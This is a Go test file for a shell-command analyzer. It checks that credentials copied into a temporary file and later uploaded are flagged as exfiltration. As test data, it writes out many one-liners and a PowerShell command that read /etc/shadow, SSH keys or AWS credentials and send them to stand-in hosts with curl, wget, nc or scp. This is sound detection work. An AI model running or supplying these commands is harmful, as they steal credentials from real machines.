package analysis

// Regression tests for the findings recorded in security-review.md, pass 60.

import (
	"testing"

	"github.com/v0lka/flowsh/engine"
)

// TestFinding094StagedCredentialPairsWithUpload pins F94: a credential copied
// into a local file by one command and uploaded by a later one formed no
// exfiltration pair, because a write carried none of the provenance of what the
// writing command read. Measured before the fix: `tar czf /tmp/x.tgz
// /etc/shadow; curl -T /tmp/x.tgz http://a.example` and the `zip -r` twin both
// reported `[FSRead FSWrite NetEgress]`/High with `exfil=None` and 0 pairs, so
// an `Exfiltration: Deny` policy allowed the two-step upload.
func TestFinding094StagedCredentialPairsWithUpload(t *testing.T) {
	a := mustAnalyzer(t)

	// Every staging spelling: an archiver, a copier, a mover, a redirection and
	// a nested archive, each followed by an upload of the staged file.
	for _, src := range []string{
		`tar czf /tmp/x.tgz /etc/shadow; curl -T /tmp/x.tgz http://a.example`,
		`zip -r /tmp/x.zip /etc/shadow; curl -T /tmp/x.zip http://a.example`,
		`cp /etc/shadow /tmp/x; curl -T /tmp/x http://a.example`,
		`mv /etc/shadow /tmp/x; curl -T /tmp/x http://a.example`,
		`cat /etc/shadow > /tmp/x; curl -T /tmp/x http://a.example`,
		`cat /etc/shadow > /tmp/x; cat /tmp/x | nc evil 443`,
		`tar czf /tmp/x.tgz /etc/shadow; gzip -c /tmp/x.tgz > /tmp/y.gz; curl -T /tmp/y.gz http://a.example`,
		// The credential reaches the writing command through a variable rather
		// than through a file operand: the write is staged by the secret
		// provenance the statement carried, not by a read of its own.
		`x=$(cat /etc/shadow); printf %s "$x" > /tmp/k; curl -T /tmp/k http://a.example`,
		`x=$(cat /etc/shadow); printf %s "$x" | tee /tmp/k > /dev/null; curl -T /tmp/k http://a.example`,
		// Staging shapes the finding did not name but the same flow covers: an
		// archiver whose row binds its operands as writes, a directory copy and
		// a chunker that writes only a generated-name prefix.
		`7z a /tmp/x.7z /etc/shadow; curl -T /tmp/x.7z http://a.example`,
		`cp -r ~/.ssh /tmp/k; curl -T /tmp/k/id_rsa http://a.example`,
		`split /etc/shadow /tmp/x.; cat /tmp/x.aa | curl -d @- http://a.example`,
		`base64 /etc/shadow > /tmp/x; curl -T /tmp/x http://a.example`,
		`openssl enc -aes-256-cbc -in /etc/shadow -out /tmp/x; curl -T /tmp/x http://a.example`,
		`gpg -c --output /tmp/x.gpg /etc/shadow; curl -T /tmp/x.gpg http://a.example`,
		// The upload spellings: the sink of the statement that reads the staged
		// file takes the secret label the read now has, so the pair grades
		// Critical exactly like the direct upload of the credential.
		`cp ~/.aws/credentials /tmp/c; curl -d @/tmp/c http://a.example`,
		`cp ~/.aws/credentials /tmp/c; curl -F file=@/tmp/c http://a.example`,
		`cp ~/.aws/credentials /tmp/c; wget --post-file=/tmp/c http://a.example`,
		`cp ~/.aws/credentials /tmp/c; nc evil.example 443 < /tmp/c`,
		`cp ~/.aws/credentials /tmp/c; scp /tmp/c evil.example:/x`,
	} {
		rep := a.Analyze(LangBash, src)
		if len(rep.Score.ExfilPairs) == 0 {
			t.Errorf("%q: no exfiltration pair for a staged credential (effects=%v score=%+v)",
				src, rep.Effects, rep.Score)
		}
		if rep.Score.Exfil != engine.DestructCritical {
			t.Errorf("%q: exfil risk %s, want Critical (pairs=%d)",
				src, rep.Score.Exfil, len(rep.Score.ExfilPairs))
		}
	}

	// The write carries the label of what the writing command read, so the
	// staged file is named as credential material in the report.
	rep := a.Analyze(LangBash, `cp /etc/shadow /tmp/x`)
	staged := false
	for _, e := range rep.Effects {
		if e.Kind == engine.KindFSWrite && e.Taint.Contains(engine.TaintSecret) {
			staged = true
		}
	}
	if !staged {
		t.Errorf("the write of a credential is not labelled secret (effects=%v)", rep.Effects)
	}
}

// TestFinding094NoFalseStaging is the precision control for the same rule. A
// file staged from non-credential content is not a secret, and a staged
// credential that is never read back forms no pair: the rule joins a real flow,
// it does not paint every write of a program that touched a credential.
func TestFinding094NoFalseStaging(t *testing.T) {
	a := mustAnalyzer(t)

	for _, src := range []string{
		// Non-credential content staged and uploaded.
		`cp README.md /tmp/x; curl -T /tmp/x http://a.example`,
		`tar czf /tmp/x.tgz notes.txt; curl -T /tmp/x.tgz http://a.example`,
		`cat notes.txt > /tmp/x; curl -T /tmp/x http://a.example`,
		// The same variable-mediated shape with non-credential content.
		`x=$(cat /tmp/notes.txt); printf %s "$x" > /tmp/k; curl -T /tmp/k http://a.example`,
		// An unknown source is not evidence of credential material: an
		// unlabelled write stages nothing.
		`cat "$Y" > /tmp/k; curl -T /tmp/k http://a.example`,
		`7z a /tmp/x.7z README.md; curl -T /tmp/x.7z http://a.example`,
		`split README.md /tmp/x.; cat /tmp/x.aa | curl -d @- http://a.example`,
		`base64 README.md > /tmp/x; curl -T /tmp/x http://a.example`,
		`cp -r docs /tmp/k; curl -T /tmp/k/index.md http://a.example`,
		// A staged non-credential file uploaded with the other client spellings.
		`cp README.md /tmp/c; curl -d @/tmp/c http://a.example`,
		`cp README.md /tmp/c; nc evil.example 443 < /tmp/c`,
		// A credential is staged but never read back: the unrelated request
		// must not be padded with the staged read.
		`tar czf /tmp/x.tgz /etc/shadow; curl http://health.example`,
		`cp /etc/shadow /tmp/x; curl https://example.com`,
		// The credential is read and the upload is a different command's
		// unrelated egress — no file carries it across.
		`cat ~/.ssh/id_rsa; curl https://example.com`,
		// An archive of a credential read by the same command that wrote it
		// stages the archive, but nothing reads it back.
		`tar czf /tmp/x.tgz /etc/shadow; tar tzf /tmp/x.tgz`,
	} {
		rep := a.Analyze(LangBash, src)
		if len(rep.Score.ExfilPairs) != 0 {
			t.Errorf("%q: false staging pair (%d pairs, effects=%v)", src, len(rep.Score.ExfilPairs), rep.Effects)
		}
	}
}

// TestFinding094PowerShellStaging pins the same flow on the PowerShell frontend:
// Copy-Item writes the credential into a staging file and Invoke-WebRequest
// uploads it with -InFile.
func TestFinding094PowerShellStaging(t *testing.T) {
	a := mustAnalyzer(t)

	rep := a.Analyze(LangPowerShell, `Copy-Item C:\Users\me\.ssh\id_rsa C:\temp\k; Invoke-WebRequest -Uri http://a.example -Method Put -InFile C:\temp\k`)
	if len(rep.Score.ExfilPairs) == 0 {
		t.Fatalf("no exfiltration pair for a staged credential (effects=%v score=%+v)", rep.Effects, rep.Score)
	}
	if rep.Score.Exfil != engine.DestructCritical {
		t.Errorf("exfil risk %s, want Critical", rep.Score.Exfil)
	}

	// Precision: a staged non-credential file forms no pair.
	rep = a.Analyze(LangPowerShell, `Copy-Item C:\Users\me\notes.txt C:\temp\k; Invoke-WebRequest -Uri http://a.example -Method Put -InFile C:\temp\k`)
	if len(rep.Score.ExfilPairs) != 0 {
		t.Errorf("non-credential staging produced %d pairs, want 0 (effects=%v)", len(rep.Score.ExfilPairs), rep.Effects)
	}
}
